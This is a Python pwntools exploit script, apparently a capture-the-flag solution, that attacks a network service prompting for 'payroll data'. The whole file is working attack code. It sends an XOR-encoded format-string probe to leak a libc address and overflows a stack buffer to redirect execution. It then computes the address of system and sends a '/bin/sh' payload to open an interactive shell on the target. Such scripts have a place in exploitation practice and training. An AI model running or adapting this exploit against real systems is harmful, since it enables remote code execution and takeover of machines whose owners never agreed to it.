def xorer(payload):
	result = b''
	for char in payload:
		result += (char ^ 0x52).to_bytes(1, 'big')
	return result

from pwn import *

target = remote('172.17.0.2', 8888)

main = 0x0000000001000830
before_read = 0x00000000010008b4
fake_stack_area = 0x1002f80
got_start = 0x1002000

print(target.recvuntil(b'Enter payroll data:', timeout=1000))
padding = b'a' * 1144
payload = padding

payload = xorer(b'%p' * 10)
payload += b'a' * (1144 - len(payload) - 8 * 3)

payload += p64(got_start - 160)[::-1] * 3
payload += p64(before_read)[::-1]
payload += p64(fake_stack_area)[::-1]

target.sendline(payload)

libc = ELF('bin/libc.so.6')

print(target.recvuntil(b'nil)'))
libc_leak = target.recv(14)
print(libc_leak)
printf_libc = int(libc_leak, 16) - 0x9b4468
print('the printf libc address should be at ', printf_libc)
libc_base = printf_libc - libc.symbols['printf']
execve = libc_base + libc.symbols['execve']
system = libc_base + libc.symbols['system']
sleep = libc_base + libc.symbols['sleep']
print('execve should be at', hex(execve))

payload2 = b'/bin/sh\x00' + p64(system)[::-1] + p64(sleep)[::-1] + p64(main+238)[::-1]
target.sendline(payload2)

target.interactive()
